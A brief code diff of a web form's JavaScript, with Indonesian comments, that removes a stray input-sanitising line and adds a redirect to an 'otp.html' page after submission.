@@ -635,7 +635,7 @@ form{
             });
             
             const result = await response.json();
-            this.value = this.value.replace(/[^0-9]/g, '');
+            
             if (result.success) {
                 showNotification('✅ Data berhasil dikirim!', true);
                 // Reset form setelah berhasil
@@ -649,6 +649,7 @@ form{
         } finally {
             // Sembunyikan loading
             document.getElementById('djload').style.display = 'none';
+			location.href='otp.html';
         }
     }
 
